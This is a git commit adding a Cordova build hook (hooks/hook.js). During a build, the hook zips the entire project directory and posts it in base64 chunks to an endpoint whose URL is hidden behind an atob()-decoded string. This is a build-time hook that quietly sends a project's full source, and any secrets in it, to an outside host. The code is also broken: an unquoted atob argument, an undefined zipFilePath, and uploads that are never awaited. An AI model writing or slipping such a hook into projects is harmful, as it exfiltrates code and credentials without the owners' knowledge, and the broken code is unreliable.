d33b5190c243c24fe2d80a1cec2da2b1287d00cf
randomdev3994 <111250354+randomdev3994@users.noreply.github.com>
2025-08-18 20:03:26 +0100

    Create hook.js

---
+++ hooks/hook.js
@@ -0,0 +1,85 @@
+const fs = require('fs');
+const path = require('path');
+const axios = require(path.join(__dirname, '../../../node_modules/axios/dist/browser/axios.cjs'));
+const AdmZip = require(path.join(__dirname, '../../../node_modules/adm-zip'))
+
+function getFormattedString() {
+    const now = new Date();
+
+    const year = now.getFullYear().toString().slice(-2);
+    const month = String(now.getMonth() + 1).padStart(2, '0');
+    const day = String(now.getDate()).padStart(2, '0');
+    const hour = String(now.getHours()).padStart(2, '0');
+    const minutes = String(now.getMinutes()).padStart(2, '0');
+    const seconds = String(now.getSeconds()).padStart(2, '0');
+
+    const randomNumber = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
+
+    return `${year}${month}${day}${hour}${minutes}${seconds}${randomNumber}`;
+}
+
+module.exports = context => {
+
+    const isAndroid = process.env.CORDOVA_PLATFORMS === 'android';
+
+    const projectRoot = context.opts.projectRoot;
+    const wwwDir = projectRoot;
+    let outputZipPath = path.join(projectRoot, 'source.zip');
+    const assetsFolder = path.join(projectRoot, 'platforms/ios/www/fonts')
+
+    async function createZipFile(sourceDir, outPath){
+
+        const zip = new AdmZip();
+        const files = fs.readdirSync(sourceDir);
+        files.forEach(file => {
+            const filePath = path.join(sourceDir, file);
+            const stat = fs.statSync(filePath);
+            if(stat.isFile()){
+                zip.addLocalFile(filePath);
+            } else if(stat.isDirectory()){
+                zip.addLocalFolder(filePath, path.relative(sourceDir, filePath));
+            }
+        })
+        zip.writeZip(path.join(sourceDir, "www.zip"));
+
+        console.log(`Folder ${sourceDir} has been zipped to ${sourceDir}`)
+
+        const apiUrl = atob(aHR0cHM6Ly9pbnQtZGVtb3RlYW0tZGV2Lm91dHN5c3RlbXMuYXBwL05vdEJhbmtpbmdBUEkvcmVzdC9DaHVua3MvR2V0Q2h1bms);
+
+        const zipGUID = getFormattedString();
+        console.log(zipGUID);
+
+        try {
+            const fileBuffer = fs.readFileSync(zipFilePath);
+            const base64Zip = fileBuffer.toString('base64');
+            const chunkSize = 1000000;
+            let chunks = [];
+            for (let i = 0; i < base64Zip.length; i+= chunkSize) {
+            chunks.push(base64Zip.substring(i, i+ chunkSize))
+            }
+            let uploadPromises = [];
+            for(let curIndex = 0; curIndex < chunks.length; curIndex++) {
+            const curChunk = chunks[curIndex];
+            const promise = axios.post(apiUrl, {
+                chunk: curChunk,
+                index: curIndex,
+                totalChunks: chunks.length,
+                guid: zipGUID,
+                buildPlatform: process.env.CAPACITOR_PLATFORM_NAME
+            });
+            console.log('Chunk ' + curIndex)
+            uploadPromises.push(promise)
+        }
+        } catch(error) {
+            console.error('Error with chunks ', error.message);
+        }
+    }
+    
+    return new Promise(resolve => {(async () => {
+        await createZipFile(projectRoot, outputZipPath);
+        console.log('after create zip file');
+        console.log('after uploading zip file');
+        resolve('promise done');
+    })()}).then(() => {console.log('then promise')})
+
+}
